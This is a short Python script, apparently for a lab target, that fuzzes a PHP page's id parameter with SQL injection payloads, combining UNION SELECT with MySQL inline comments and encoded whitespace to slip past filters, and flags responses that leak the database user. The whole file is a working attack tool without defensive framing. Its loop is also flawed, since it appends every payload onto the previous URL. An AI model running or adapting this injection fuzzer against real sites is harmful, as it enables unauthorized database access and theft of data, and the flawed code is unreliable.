# _*_  coding:utf-8 _*_

import requests

fuzz_dic1 = ['*/','/*','*/','/*!','*','=','`','!','@','%','.','-','+','|','%00']
fuzz_dic2 = ['*/','',' ','/*!']
fuzz_dic3 = ['/*!',"%a0","0c","%0a","%0b","%0c","%0d","%0e","%0f","%0g","%0h","%0i","%0j"]
headers={"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"}

url="http://192.168.125.140/php/config/sql.php?id=1"

for i in fuzz_dic1:
    for j in fuzz_dic2:
        for k in fuzz_dic3:
            payload="/*!union"+i+j+k+"select*/ 1,user()"
            url = url + payload
            try:
                response=requests.get(url=url,headers=headers)
                result = response.content
                #print result
                if "root" in result:
                    print(url)
                else:
                    pass
            except:
                print("error")